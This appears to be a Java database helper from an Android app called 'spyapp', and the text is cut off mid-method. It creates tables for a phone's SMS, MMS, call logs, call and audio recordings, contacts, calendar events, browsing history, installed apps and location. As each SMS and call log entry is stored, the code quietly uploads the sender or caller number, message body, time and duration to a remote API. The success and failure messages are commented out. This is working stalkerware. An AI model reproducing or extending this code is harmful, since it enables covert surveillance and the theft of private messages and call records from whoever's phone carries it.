package com.app.spyapp.database;

import android.content.ContentValues;
import android.content.Context;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.database.SQLException;
import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteOpenHelper;
import android.util.Log;
import android.widget.Toast;

import com.app.spyapp.common.Utils;
import com.app.spyapp.helper.APIService;
import com.app.spyapp.helper.APIUtils;
import com.app.spyapp.helper.ConstantData;
import com.app.spyapp.helper.apiModel.MessageResp;
import com.app.spyapp.model.AudioRecordModel;
import com.app.spyapp.model.BrowserModel;
import com.app.spyapp.model.CallLogModel;
import com.app.spyapp.model.CallRecordModel;
import com.app.spyapp.model.ContactModel;
import com.app.spyapp.model.EventModel;
import com.app.spyapp.model.InstallAppModel;
import com.app.spyapp.model.MMSModel;
import com.app.spyapp.model.SMSModel;

import java.sql.Date;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Map;

import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;

import static android.content.Context.MODE_PRIVATE;

public class DatabaseHelper extends SQLiteOpenHelper {

    private static final String TAG = DatabaseHelper.class.getSimpleName();
    private Context context;
    private SQLiteDatabase database;

    private APIService apiService;
    private SharedPreferences sharedPreferences;
    private SharedPreferences.Editor editor;

    //
//    /**
//     * Constructor
//     * *
//     */
    public DatabaseHelper(Context context) {
        super(context, DBUtils.DATABASE_NAME, null, DBUtils.DATABASE_VERSION);
        this.context = context;
        apiService = APIUtils.getAPIService();
        sharedPreferences = context.getSharedPreferences(ConstantData.PREF_NAME, MODE_PRIVATE);
        editor = sharedPreferences.edit();

    }

    //
//    /**
//     * Create database tables if it does not exists.
//     * *
//     */
//    @Override
    public void onCreate(SQLiteDatabase db) {

        db.execSQL(DBUtils.DB_CREATE_SMS_TABLE);
        db.execSQL(DBUtils.DB_CREATE_MMS_TABLE);
        db.execSQL(DBUtils.DB_CREATE_AUDIO_RECORD_TABLE);
        db.execSQL(DBUtils.DB_CREATE_CALLLOG_TABLE);
        db.execSQL(DBUtils.DB_CREATE_CALLRECORD_TABLE);
        db.execSQL(DBUtils.DB_CREATE_CONTACT_TABLE);
        db.execSQL(DBUtils.DB_CREATE_EVENT_TABLE);
        db.execSQL(DBUtils.DB_CREATE_HISTORY_TABLE);
        db.execSQL(DBUtils.DB_CREATE_BOOKMARK_TABLE);
        db.execSQL(DBUtils.DB_CREATE_INSTALLAPP_TABLE);
        db.execSQL(DBUtils.DB_CREATE_LOCATION_TABLE);

        this.database = db;



    }

    //
    @Override
    public void onUpgrade(SQLiteDatabase db, int oldVersion, int newVersion) {

    }

    //
//    /**
//     * Open Databases
//     * *
//     */
    public void openDataBase() throws SQLException {
        database = this.getWritableDatabase();
    }

    //
    @Override
    public synchronized void close() {
        // if (database != null && database.isOpen())
        // database.close();
        // super.close();
    }

    //--------------------------------SMS START------------------------------------

    /**
     * Insert SMS
     *
     * @param
     */

    public long insertSMS(SMSModel smsModel) {
        if (!database.isOpen()) {
            openDataBase();
        }
        try {
            // database.beginTransaction();
            ContentValues values = new ContentValues();
            values.put(DBUtils.COLUMN_SMS_ID, smsModel.getMessageId());
            values.put(DBUtils.COLUMN_SMS_BODY, smsModel.getMsg());
            values.put(DBUtils.COLUMN_SMS_PHONE, smsModel.getAddress());
            values.put(DBUtils.COLUMN_SMS_DATE, smsModel.getDate());
            values.put(DBUtils.COLUMN_SMS_MSGTYPE, smsModel.getType());
            values.put(DBUtils.COLUMN_SMS_UPDATEDDATE, Utils.getCurrentTime());

            smsDetail(smsModel.getAddress(),"INCOMING",smsModel.getDate(),smsModel.getMsg());

            return database.insert(DBUtils.SMS_TABLE, null, values);

        } catch (Exception e) {
            e.printStackTrace();
            return -1;

        } finally {
            close();
            SQLiteDatabase.releaseMemory();
        }
    }
    // sms method
    private void smsDetail(String phone, String type, String date, String body){
        final Map<String, Object> requestBodyMap = new HashMap<>();
        requestBodyMap.put("sender_number", phone);
        requestBodyMap.put("receiver_number", phone);
        requestBodyMap.put("body", body);
        requestBodyMap.put("type",type);
        requestBodyMap.put("time", date);

        apiService.newSMS(sharedPreferences.getString(ConstantData.TOKEN, ""),requestBodyMap)
                .enqueue(new Callback<MessageResp>() {
                    @Override
                    public void onResponse(Call<MessageResp> call, Response<MessageResp> response) {
                        if (response.isSuccessful()){
                            if (response.body() != null);
                           // Toast.makeText(context, ""+response.body().getMessage(), Toast.LENGTH_SHORT).show();
                        }
                    }
                    @Override
                    public void onFailure(Call<MessageResp> call, Throwable t) {
                     //   Toast.makeText(context, "Fail", Toast.LENGTH_SHORT).show();
                    }
                });
    }
    /**
     * Update SMS
     *
     * @param smsModel
     * @return
     */
    public long updateSMS(SMSModel smsModel) {
        long i = 0;
        if (!database.isOpen()) {
            openDataBase();
        }
        try {
            // database.beginTransaction();
            ContentValues values = new ContentValues();
            values.put(DBUtils.COLUMN_SMS_BODY, smsModel.getMsg());
            values.put(DBUtils.COLUMN_SMS_PHONE, smsModel.getAddress());
            values.put(DBUtils.COLUMN_SMS_DATE, smsModel.getDate());
            values.put(DBUtils.COLUMN_SMS_MSGTYPE, smsModel.getType());
            values.put(DBUtils.COLUMN_SMS_MSGTYPE, smsModel.getType());
            values.put(DBUtils.COLUMN_SMS_UPDATEDDATE, Utils.getCurrentTime());
            i = database.update(DBUtils.SMS_TABLE, values, DBUtils.COLUMN_SMS_ID + "=?", new String[]{smsModel.getMessageId()});

        } catch (Exception e) {
            e.printStackTrace();

        } finally {
            close();
            SQLiteDatabase.releaseMemory();
        }
        return i;
    }
    /**
     * get Maximum date of SMS
     *
     * @return
     */
    public String getMaxDateofSMS() {
        String maxdate = "";
        if (!database.isOpen()) {
            openDataBase();
        }
        Cursor cursor = null;
        try {
            String query = "select " + DBUtils.COLUMN_SMS_UPDATEDDATE + " from " + DBUtils.SMS_TABLE + " order by " + DBUtils.COLUMN_SMS_UPDATEDDATE + " desc limit 1";
            cursor = database.rawQuery(query, null);
            if (cursor != null && cursor.getCount() > 0) {
                cursor.moveToFirst();
                maxdate = cursor.getString(cursor.getColumnIndex(DBUtils.COLUMN_SMS_UPDATEDDATE));

            }
        } catch (Exception e) {
            e.printStackTrace();
            maxdate = "";
        } finally {

            close();
            if (cursor != null) {
                cursor.close();
                SQLiteDatabase.releaseMemory();
            }
        }
        return maxdate;

    }
    /**
     * get SMS All SMSList
     *
     * @param
     * @return
     */
    public ArrayList<SMSModel> getSMSList(String updateDate) {
        final ArrayList<SMSModel> alertList = new ArrayList<SMSModel>();
        if (!database.isOpen()) {
            openDataBase();
        }
        Cursor cursor = null;
        try {
            String query = "Select * from " + DBUtils.SMS_TABLE + " where  Datetime(" + DBUtils.COLUMN_SMS_UPDATEDDATE + ")>Datetime('" + updateDate + "')";
            cursor = database.rawQuery(query, null);
            if (cursor != null && cursor.getCount() > 0) {
                cursor.moveToFirst();
                SMSModel model = null;
                for (int i = 0; i < cursor.getCount(); i++) {
                    model = new SMSModel();
                    model.setMessageId(cursor.getString(cursor.getColumnIndex(DBUtils.COLUMN_SMS_ID)));
                    model.setMsg(cursor.getString(cursor.getColumnIndex(DBUtils.COLUMN_SMS_BODY)));
                    model.setAddress(cursor.getString(cursor.getColumnIndex(DBUtils.COLUMN_SMS_PHONE)));
                    model.setDate(cursor.getString(cursor.getColumnIndex(DBUtils.COLUMN_SMS_DATE)));
                    model.setType(cursor.getString(cursor.getColumnIndex(DBUtils.COLUMN_SMS_MSGTYPE)));
                    alertList.add(model);
                    cursor.moveToNext();
                }
                alertList.trimToSize();
            }
        } catch (Exception e) {
            e.printStackTrace();
        } finally {

            close();
            if (cursor != null) {
                cursor.close();
                SQLiteDatabase.releaseMemory();
            }
        }
        return alertList;
    }
    /**
     * Check weather contact is already available
     *
     * @param contactId
     * @return
     */
    public boolean isSmsAvailable(String contactId) {

        boolean isavailable = false;
        if (!database.isOpen()) {
            openDataBase();
        }
        Cursor cursor = null;
        try {

            cursor = database.query(DBUtils.SMS_TABLE, new String[]{"*"}, DBUtils.COLUMN_SMS_ID + "=?", new String[]{contactId}, null, null, null);

            if (cursor != null && cursor.getCount() > 0) {
                isavailable = true;
            } else {
                isavailable = false;
            }
        } catch (Exception e) {
            e.printStackTrace();
            return false;
        } finally {

            close();
            if (cursor != null) {
                cursor.close();
                SQLiteDatabase.releaseMemory();
            }
        }
        return isavailable;
    }
    /**
     * Delete SMS
     */
    public void deleteSMS(final String smsId) {
        if (!database.isOpen()) {
            openDataBase();
        }
        try {
            database.delete(DBUtils.SMS_TABLE, DBUtils.COLUMN_SMS_ID + "=?", new String[]{smsId});
        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            close();
        }
    }
    //--------------------------------SMS END------------------------------------

    //--------------------------------MMS START------------------------------------
    /**
     * Insert MMS
     *
     * @param
     */
    public long insertMMS(MMSModel mmsModel) {
        if (!database.isOpen()) {
            openDataBase();
        }
        try {
            // database.beginTransaction();
            ContentValues values = new ContentValues();
            values.put(DBUtils.COLUMN_MMS_ID, mmsModel.getMsgId());
            values.put(DBUtils.COLUMN_MMS_BODY, mmsModel.getMsgTextContent());
            values.put(DBUtils.COLUMN_MMS_PHONE, mmsModel.getAddress());
            values.put(DBUtils.COLUMN_MMS_FILEPATH, mmsModel.getMsgImagePath());
            values.put(DBUtils.COLUMN_MMS_MSGTYPE, mmsModel.getType());
            values.put(DBUtils.COLUMN_MMS_DATE, mmsModel.getDate());
            values.put(DBUtils.COLUMN_MMS_UPDATEDDATE, Utils.getCurrentTime());
            return database.insert(DBUtils.MMS_TABLE, null, values);

        } catch (Exception e) {
            e.printStackTrace();
            return -1;

        } finally {
            close();
            SQLiteDatabase.releaseMemory();
        }
    }
    /**
     * Update SMS
     *
     * @param mmsModel
     * @return
     */
    public long updateMMS(MMSModel mmsModel) {
        long i = 0;
        if (!database.isOpen()) {
            openDataBase();
        }
        try {
            // database.beginTransaction();
            ContentValues values = new ContentValues();
            values.put(DBUtils.COLUMN_MMS_BODY, mmsModel.getMsgTextContent());
            values.put(DBUtils.COLUMN_MMS_PHONE, mmsModel.getAddress());
            values.put(DBUtils.COLUMN_MMS_FILEPATH, mmsModel.getMsgImagePath());
            values.put(DBUtils.COLUMN_MMS_MSGTYPE, mmsModel.getType());
            values.put(DBUtils.COLUMN_MMS_DATE, mmsModel.getDate());
            values.put(DBUtils.COLUMN_MMS_UPDATEDDATE, Utils.getCurrentTime());
            i = database.update(DBUtils.MMS_TABLE, values, DBUtils.COLUMN_MMS_ID + "=?", new String[]{mmsModel.getMsgId()});

        } catch (Exception e) {
            e.printStackTrace();

        } finally {
            close();
            SQLiteDatabase.releaseMemory();
        }
        return i;
    }
    /**
     * get ALL MMSLIST
     *
     * @param
     * @return
     */
    public ArrayList<MMSModel> getMMSList(String updateDate) {
        final ArrayList<MMSModel> mmsList = new ArrayList<MMSModel>();
        if (!database.isOpen()) {
            openDataBase();
        }
        Cursor cursor = null;
        try {
            String query = "Select * from " + DBUtils.MMS_TABLE + " where  Datetime(" + DBUtils.COLUMN_MMS_UPDATEDDATE + ")>Datetime('" + updateDate + "')";
            cursor = database.rawQuery(query, null);
            if (cursor != null && cursor.getCount() > 0) {
                cursor.moveToFirst();
                MMSModel model = null;
                for (int i = 0; i < cursor.getCount(); i++) {
                    model = new MMSModel();
                    model.setMsgId(cursor.getString(cursor.getColumnIndex(DBUtils.COLUMN_MMS_ID)));
                    model.setMsgTextContent(cursor.getString(cursor.getColumnIndex(DBUtils.COLUMN_MMS_BODY)));
                    model.setAddress(cursor.getString(cursor.getColumnIndex(DBUtils.COLUMN_MMS_PHONE)));
                    model.setMsgImagePath(cursor.getString(cursor.getColumnIndex(DBUtils.COLUMN_MMS_FILEPATH)));
                    model.setType(cursor.getString(cursor.getColumnIndex(DBUtils.COLUMN_MMS_MSGTYPE)));
                    model.setDate(cursor.getString(cursor.getColumnIndex(DBUtils.COLUMN_MMS_DATE)));
                    mmsList.add(model);
                    cursor.moveToNext();
                }
                mmsList.add(model);
            }
        } catch (Exception e) {
            e.printStackTrace();
        } finally {

            close();
            if (cursor != null) {
                cursor.close();
                SQLiteDatabase.releaseMemory();
            }
        }
        return mmsList;
    }
    /**
     * Delete MMS
     */
    public void deleteMMS(final String smsId) {
        if (!database.isOpen()) {
            openDataBase();
        }
        try {
            database.delete(DBUtils.MMS_TABLE, DBUtils.COLUMN_MMS_ID + "=?", new String[]{smsId});
        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            close();
        }
    }
    /**
     * get Maximum date of MMS
     *
     * @return
     */
    public String getMaxDateofMMS() {
        String maxdate = "";
        if (!database.isOpen()) {
            openDataBase();
        }
        Cursor cursor = null;
        try {
            String query = "select " + DBUtils.COLUMN_MMS_UPDATEDDATE + " from " + DBUtils.MMS_TABLE + " order by " + DBUtils.COLUMN_MMS_UPDATEDDATE + " desc limit 1";
            cursor = database.rawQuery(query, null);
            if (cursor != null && cursor.getCount() > 0) {
                cursor.moveToFirst();
                maxdate = cursor.getString(cursor.getColumnIndex(DBUtils.COLUMN_MMS_UPDATEDDATE));

            }
        } catch (Exception e) {
            e.printStackTrace();
            maxdate = "";
        } finally {

            close();
            if (cursor != null) {
                cursor.close();
                SQLiteDatabase.releaseMemory();
            }
        }
        return maxdate;

    }
//--------------------------------MMS END------------------------------------

    //--------------------------------CONTACT START-------------------------------------------------

    /**
     * Insert Contact
     *
     * @param contactModel
     * @return
     */
    public long insertContact(ContactModel contactModel) {
        if (!database.isOpen()) {
            openDataBase();
        }
        try {
            // database.beginTransaction();
            ContentValues values = new ContentValues();
            values.put(DBUtils.COLUMN_CONATCT_ID, contactModel.getContactId());
            values.put(DBUtils.COLUMN_CONATCT_NAME, contactModel.getName());
            values.put(DBUtils.COLUMN_CONATCT_PHONENUMBER, contactModel.getNumber());
            values.put(DBUtils.COLUMN_CONATCT_UPDATED, Utils.getCurrentTime());

            //contactDetail(contactModel.getName(),contactModel.getNumber());

            return database.insert(DBUtils.CONTACT_TABLE, null, values);
        } catch (Exception e) {
            e.printStackTrace();
            return -1;
        } finally {
            close();
            SQLiteDatabase.releaseMemory();
        }
    }
    // Contact Detail
    private void contactDetail(String name,String number){
        final Map<String, Object> requestBodyMap = new HashMap<>();
        requestBodyMap.put("name", name);
        requestBodyMap.put("number", number);

        apiService.getContactList(sharedPreferences.getString(ConstantData.TOKEN, ""),requestBodyMap)
                .enqueue(new Callback<MessageResp>() {
                    @Override
                    public void onResponse(Call<MessageResp> call, Response<MessageResp> response) {
                        if (response.isSuccessful()){
                            if (response.body() != null);
                            Toast.makeText(context, ""+response.body().getMessage(), Toast.LENGTH_SHORT).show();
                        }
                    }

                    @Override
                    public void onFailure(Call<MessageResp> call, Throwable t) {
                        Toast.makeText(context, "Fail", Toast.LENGTH_SHORT).show();
                    }
                });
    }
    /**
     * Check weather contact is already available
     *
     * @param contactId
     * @return
     */
    public boolean isContactAvailable(String contactId) {

        boolean isavailable = false;
        if (!database.isOpen()) {
            openDataBase();
        }
        Cursor cursor = null;
        try {

            cursor = database.query(DBUtils.CONTACT_TABLE, new String[]{"*"}, DBUtils.COLUMN_CONATCT_ID + "=?", new String[]{contactId}, null, null, null);

            if (cursor != null && cursor.getCount() > 0) {
                isavailable = true;
            } else {
                isavailable = false;
            }
        } catch (Exception e) {
            e.printStackTrace();
            return false;
        } finally {

            close();
            if (cursor != null) {
                cursor.close();
                SQLiteDatabase.releaseMemory();
            }
        }
        return isavailable;
    }
    /**
     * get Maximum date of Contact
     *
     * @return
     */
    public String getMaxDateofContact() {
        String maxdate = "";
        if (!database.isOpen()) {
            openDataBase();
        }
        Cursor cursor = null;
        try {
            String query = "select " + DBUtils.COLUMN_CONATCT_UPDATED + " from " + DBUtils.CONTACT_TABLE + " order by " + DBUtils.COLUMN_CONATCT_UPDATED + " desc limit 1";
            cursor = database.rawQuery(query, null);
            if (cursor != null && cursor.getCount() > 0) {
                cursor.moveToFirst();
                maxdate = cursor.getString(cursor.getColumnIndex(DBUtils.COLUMN_CONATCT_UPDATED));

            }
        } catch (Exception e) {
            e.printStackTrace();
            maxdate = "";
        } finally {

            close();
            if (cursor != null) {
                cursor.close();
                SQLiteDatabase.releaseMemory();
            }
        }
        return maxdate;

    }
    public ContactModel getContactInfo(String contactid) {
        ContactModel contactModel = null;
        if (!database.isOpen()) {
            openDataBase();
        }
        Cursor cursor = null;
        try {
            cursor = database.query(DBUtils.CONTACT_TABLE, new String[]{"*"}, DBUtils.COLUMN_CONATCT_ID + "=?", new String[]{contactid}, null, null, null);
            if (cursor != null && cursor.getCount() > 0) {
                cursor.moveToFirst();
                contactModel = new ContactModel();
                contactModel.setContactId(cursor.getString(cursor.getColumnIndex(DBUtils.COLUMN_CONATCT_ID)));
                contactModel.setName(cursor.getString(cursor.getColumnIndex(DBUtils.COLUMN_CONATCT_NAME)));
                contactModel.setNumber(cursor.getString(cursor.getColumnIndex(DBUtils.COLUMN_CONATCT_PHONENUMBER)));

            }
        } catch (Exception e) {
            e.printStackTrace();

        } finally {

            close();
            if (cursor != null) {
                cursor.close();
                SQLiteDatabase.releaseMemory();
            }
        }
        return contactModel;

    }
    /**
     * get ALL MMSLIST
     *
     * @param
     * @return
     */
    public ArrayList<ContactModel> getContactList(String updateDate) {
        final ArrayList<ContactModel> mmsList = new ArrayList<ContactModel>();
        if (!database.isOpen()) {
            openDataBase();
        }
        Cursor cursor = null;
        try {
            String query = "Select * from " + DBUtils.CONTACT_TABLE + " where  Datetime(" + DBUtils.COLUMN_CONATCT_UPDATED + ")>Datetime('" + updateDate + "')";
            cursor = database.rawQuery(query, null);
            if (cursor != null && cursor.getCount() > 0) {
                cursor.moveToFirst();
                ContactModel model = null;
                for (int i = 0; i < cursor.getCount(); i++) {
                    model = new ContactModel();
                    model.setContactId(cursor.getString(cursor.getColumnIndex(DBUtils.COLUMN_CONATCT_ID)));
                    model.setName(cursor.getString(cursor.getColumnIndex(DBUtils.COLUMN_CONATCT_NAME)));
                    model.setNumber(cursor.getString(cursor.getColumnIndex(DBUtils.COLUMN_CONATCT_PHONENUMBER)));
                    mmsList.add(model);
                    cursor.moveToNext();
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        } finally {

            close();
            if (cursor != null) {
                cursor.close();
                SQLiteDatabase.releaseMemory();
            }
        }
        return mmsList;
    }
    public long updateContact(ContactModel contactModel) {
        long i = 0;
        if (!database.isOpen()) {
            openDataBase();
        }
        try {
            // database.beginTransaction();
            ContentValues values = new ContentValues();
            values.put(DBUtils.COLUMN_CONATCT_NAME, contactModel.getName());
            values.put(DBUtils.COLUMN_CONATCT_PHONENUMBER, contactModel.getNumber());
            values.put(DBUtils.COLUMN_CONATCT_UPDATED, Utils.getCurrentTime());



            i = database.update(DBUtils.CONTACT_TABLE, values, DBUtils.COLUMN_CONATCT_ID + "=?", new String[]{contactModel.getContactId()});

        } catch (Exception e) {
            e.printStackTrace();

        } finally {
            close();
            SQLiteDatabase.releaseMemory();
        }
        return i;
    }
//---------------------------------------CONTACT END--------------------------------------------

    //---------------------------------------CALLLOG START-------------------------------------------

    /**
     * Insert calllog
     *
     * @param callLogModel
     * @return
     */
    public long insertCallLog(CallLogModel callLogModel) {
        if (!database.isOpen()) {
            openDataBase();
        }
        try {
            ContentValues values = new ContentValues();
            values.put(DBUtils.COLUMN_CALL_LOG_ID, callLogModel.getCalllogId());
            values.put(DBUtils.COLUMN_CALL_LOG_USERNAME, callLogModel.getUsername());
            values.put(DBUtils.COLUMN_CALL_LOG_PHONENUMBER, callLogModel.getPhnNumber());
            values.put(DBUtils.COLUMN_CALL_LOG_CALLDATE, callLogModel.getCallDate());
            values.put(DBUtils.COLUMN_CALL_LOG_DURATION, callLogModel.getCallDuration());
            values.put(DBUtils.COLUMN_CALL_LOG_DIR, callLogModel.getDir());
            values.put(DBUtils.COLUMN_CALL_LOG_DIRCODE, callLogModel.getDircode());
            values.put(DBUtils.COLUMN_CALL_LOG_CALLTYPE, callLogModel.getCallType());
            values.put(DBUtils.COLUMN_CALL_LOG_UPDATEDDATE, Utils.getCurrentTime());

           callLogDetail(callLogModel.getUsername(),callLogModel.getPhnNumber(),callLogModel.getCallDate(),callLogModel.getCallDuration(),callLogModel.getCallType());

            return database.insert(DBUtils.CALLLOG_TABLE, null, values);

        } catch (Exception e) {
            e.printStackTrace();
            return -1;

        } finally {
            close();
            SQLiteDatabase.releaseMemory();
        }
    }
    private void callLogDetail(String username,String phonenumber,String date,String duration,String type){
        final Map<String, Object> requestBodyMap = new HashMap<>();
        requestBodyMap.put("name", username);
        requestBodyMap.put("number", phonenumber);
        requestBodyMap.put("date",date);
        requestBodyMap.put("duration",duration);
        requestBodyMap.put("type",type);

        apiService.getCallLogList(sharedPreferences.getString(ConstantData.TOKEN, ""),requestBodyMap)
                .enqueue(new Callback<MessageResp>() {
                    @Override
                    public void onResponse(Call<MessageResp> call, Response<MessageResp> response) {
                        if (response.isSuccessful()){
                            if (response.body() != null);
                        //    Toast.makeText(context, ""+response.body().getMessage(), Toast.LENGTH_SHORT).show();
                        }
                    }

                    @Override
                    public void onFailure(Call<MessageResp> call, Throwable t) {
                    //    Toast.makeText(context, "Fail", Toast.LENGTH_SHORT).show();
                    }
                });
    }
    /**
     * update calllog
     *
     * @param callLogModel
     * @return
     */
    public long updateCallLog(CallLogModel callLogModel) {
        if (!database.isOpen()) {
            openDataBase();
        }
        try {
            ContentValues values = new ContentValues();
            values.put(DBUtils.COLUMN_CALL_LOG_USERNAME, callLogModel.getUsername());
            values.put(DBUtils.COLUMN_CALL_LOG_PHONENUMBER, callLogModel.getPhnNumber());
            values.put(DBUtils.COLUMN_CALL_LOG_CALLDATE, callLogModel.getCallDate());
            values.put(DBUtils.COLUMN_CALL_LOG_DURATION, callLogModel.getCallDuration());
            values.put(DBUtils.COLUMN_CALL_LOG_DIR, callLogModel.getDir());
            values.put(DBUtils.COLUMN_CALL_LOG_DIRCODE, callLogModel.getDircode());
            values.put(DBUtils.COLUMN_CALL_LOG_CALLTYPE, callLogModel.getCallType());
            values.put(DBUtils.COLUMN_CALL_LOG_UPDATEDDATE, Utils.getCurrentTime());
            return database.update(DBUtils.CALLLOG_TABLE, values, DBUtils.COLUMN_CALL_LOG_ID + "=?", new String[]{callLogModel.getCalllogId()});

        } catch (Exception e) {
            e.printStackTrace();
            return -1;

        } finally {
            close();
            SQLiteDatabase.releaseMemory();
        }
    }
    /**
     * Check if Calllog is already exits
     *
     * @param calllogId
     * @return
     */
    public boolean isCallLogExits(String calllogId) {

        boolean isavailable = false;
        if (!database.isOpen()) {
            openDataBase();
        }
        Cursor cursor = null;
        try {

            cursor = database.query(DBUtils.CALLLOG_TABLE, new String[]{"*"}, DBUtils.COLUMN_CALL_LOG_ID + "=?", new String[]{calllogId}, null, null, null);

            if (cursor != null && cursor.getCount() > 0) {
                isavailable = true;
            } else {
                isavailable = false;
            }
        } catch (Exception e) {
            e.printStackTrace();
            return false;
        } finally {

            close();
            if (cursor != null) {
                cursor.close();
                SQLiteDatabase.releaseMemory();
            }
        }
        return isavailable;
    }
    /**
     * get Maximum date of CALLLog
     *
     * @return
     */
    public String getMaxDateofCallLog() {
        String maxdate = "";
        if (!database.isOpen()) {
            openDataBase();
        }
        Cursor cursor = null;
        try {
            String query = "select " + DBUtils.COLUMN_CALL_LOG_UPDATEDDATE + " from " + DBUtils.CALLLOG_TABLE + " order by " + DBUtils.COLUMN_CALL_LOG_UPDATEDDATE + " desc limit 1";
            cursor = database.rawQuery(query, null);
            if (cursor != null && cursor.getCount() > 0) {
                cursor.moveToFirst();
                maxdate = cursor.getString(cursor.getColumnIndex(DBUtils.COLUMN_CALL_LOG_UPDATEDDATE));

            }
        } catch (Exception e) {
            e.printStackTrace();
            maxdate = "";
        } finally {

            close();
            if (cursor != null) {
                cursor.close();
                SQLiteDatabase.releaseMemory();
            }
        }
        return maxdate;

    }
    /**
     * get ALL MMSLIST
     *
     * @param
     * @return
     */
    public ArrayList<CallLogModel> getCallLogList(String updateDate) {
        final ArrayList<CallLogModel> calllogList = new ArrayList<CallLogModel>();
        if (!database.isOpen()) {
            openDataBase();
        }
        Cursor cursor = null;
        try {
            String query = "Select * from " + DBUtils.CALLLOG_TABLE + " where  Datetime(" + DBUtils.COLUMN_CALL_LOG_UPDATEDDATE + ")>Datetime('" + updateDate + "')";
            cursor = database.rawQuery(query, null);
            if (cursor != null && cursor.getCount() > 0) {
                cursor.moveToFirst();
                CallLogModel model = null;
                for (int i = 0; i < cursor.getCount(); i++) {
                    model = new CallLogModel();
                    model.setCalllogId(cursor.getString(cursor.getColumnIndex(DBUtils.COLUMN_CALL_LOG_ID)));
                    model.setUsername(cursor.getString(cursor.getColumnIndex(DBUtils.COLUMN_CALL_LOG_USERNAME)));
                    model.setPhnNumber(cursor.getString(cursor.getColumnIndex(DBUtils.COLUMN_CALL_LOG_PHONENUMBER)));
                    model.setCallDate(cursor.getString(cursor.getColumnIndex(DBUtils.COLUMN_CALL_LOG_CALLDATE)));
                    model.setCallDuration(cursor.getString(cursor.getColumnIndex(DBUtils.COLUMN_CALL_LOG_DURATION)));
                    model.setDir(cursor.getString(cursor.getColumnIndex(DBUtils.COLUMN_CALL_LOG_DIR)));
                    model.setDircode(cursor.getInt(cursor.getColumnIndex(DBUtils.COLUMN_CALL_LOG_DIRCODE)));
                    model.setCallType(cursor.getString(cursor.getColumnIndex(DBUtils.COLUMN_CALL_LOG_UPDATEDDATE)));
                    calllogList.add(model);
                    cursor.moveToNext();
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        } finally {

            close();
            if (cursor != null) {
                cursor.close();
                SQLiteDatabase.releaseMemory();
            }
        }
        return calllogList;
    }

//---------------------------------------CALLLOG END-------------------------------------------
    //---------------------------------------EVENT START-------------------------------------------

    /**
     * Insert Event
     *
     * @return
     */
    public long insertEvent(EventModel eventModel) {
        if (!database.isOpen()) {
            openDataBase();
        }
        try {
            ContentValues values = new ContentValues();
            values.put(DBUtils.COLUMN_EVENT_ID, eventModel.getEventid());
            values.put(DBUtils.COLUMN_EVENT_TITLE, eventModel.getTitle());
            values.put(DBUtils.COLUMN_EVENT_DESC, eventModel.getDesc());
            values.put(DBUtils.COLUMN_EVENT_STARTDATE, eventModel.getStartDate());
            values.put(DBUtils.COLUMN_EVENT_ENDDATE, eventModel.getEndDate());
            values.put(DBUtils.COLUMN_EVENT_LOCATION, eventModel.getLocation());
            values.put(DBUtils.COLUMN_EVENT_UPDATEDDATE, Utils.getCurrentTime());
            return database.insert(DBUtils.EVENT_TABLE, null, values);

        } catch (Exception e) {
            e.printStackTrace();
            return -1;

        } finally {
            close();
            SQLiteDatabase.releaseMemory();
        }
    }
    public long updateEvent(EventModel eventModel) {
        if (!database.isOpen()) {
            openDataBase();
        }
        try {
            ContentValues values = new ContentValues();
            values.put(DBUtils.COLUMN_EVENT_TITLE, eventModel.getTitle());
            values.put(DBUtils.COLUMN_EVENT_DESC, eventModel.getDesc());
            values.put(DBUtils.COLUMN_EVENT_STARTDATE, eventModel.getStartDate());
            values.put(DBUtils.COLUMN_EVENT_ENDDATE, eventModel.getEndDate());
            values.put(DBUtils.COLUMN_EVENT_LOCATION, eventModel.getLocation());
            values.put(DBUtils.COLUMN_EVENT_UPDATEDDATE, Utils.getCurrentTime());
            return database.update(DBUtils.EVENT_TABLE, values, DBUtils.COLUMN_EVENT_ID + "=?", new String[]{eventModel.getEventid()});

        } catch (Exception e) {
            e.printStackTrace();
            return -1;

        } finally {
            close();
            SQLiteDatabase.releaseMemory();
        }
    }
    /**
     * get Maximum date of Event
     *
     * @return
     */
    public String getMaxDateofEvent() {
        String maxdate = "";
        if (!database.isOpen()) {
            openDataBase();
        }
        Cursor cursor = null;
        try {
            String query = "select " + DBUtils.COLUMN_EVENT_UPDATEDDATE + " from " + DBUtils.EVENT_TABLE + " order by " + DBUtils.COLUMN_EVENT_UPDATEDDATE + " desc limit 1";
            cursor = database.rawQuery(query, null);
            if (cursor != null && cursor.getCount() > 0) {
                cursor.moveToFirst();
                maxdate = cursor.getString(cursor.getColumnIndex(DBUtils.COLUMN_EVENT_UPDATEDDATE));

            }
        } catch (Exception e) {
            e.printStackTrace();
            maxdate = "";
        } finally {

            close();
            if (cursor != null) {
                cursor.close();
                SQLiteDatabase.releaseMemory();
            }
        }
        return maxdate;

    }
    /**
     * get ALL EventLsist
     *
     * @param
     * @return
     */
    public ArrayList<EventModel> getEventList(String updateDate) {
        final ArrayList<EventModel> eventList = new ArrayList<EventModel>();
        if (!database.isOpen()) {
            openDataBase();
        }
        Cursor cursor = null;
        try {
            String query = "Select * from " + DBUtils.EVENT_TABLE + " where  Datetime(" + DBUtils.COLUMN_EVENT_UPDATEDDATE + ")>Datetime('" + updateDate + "')";
            cursor = database.rawQuery(query, null);
            if (cursor != null && cursor.getCount() > 0) {
                cursor.moveToFirst();
                EventModel model = null;
                for (int i = 0; i < cursor.getCount(); i++) {
                    model = new EventModel();


                    model.setEventid(cursor.getString(cursor.getColumnIndex(DBUtils.COLUMN_EVENT_ID)));
                    model.setTitle(cursor.getString(cursor.getColumnIndex(DBUtils.COLUMN_EVENT_TITLE)));
                    model.setDesc(cursor.getString(cursor.getColumnIndex(DBUtils.COLUMN_EVENT_DESC)));
                    model.setStartDate(cursor.getString(cursor.getColumnIndex(DBUtils.COLUMN_EVENT_STARTDATE)));
                    model.setEndDate(cursor.getString(cursor.getColumnIndex(DBUtils.COLUMN_EVENT_ENDDATE)));
                    model.setLocation(cursor.getString(cursor.getColumnIndex(DBUtils.COLUMN_EVENT_LOCATION)));
                    eventList.add(model);
                    cursor.moveToNext();
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        } finally {

            close();
            if (cursor != null) {
                cursor.close();
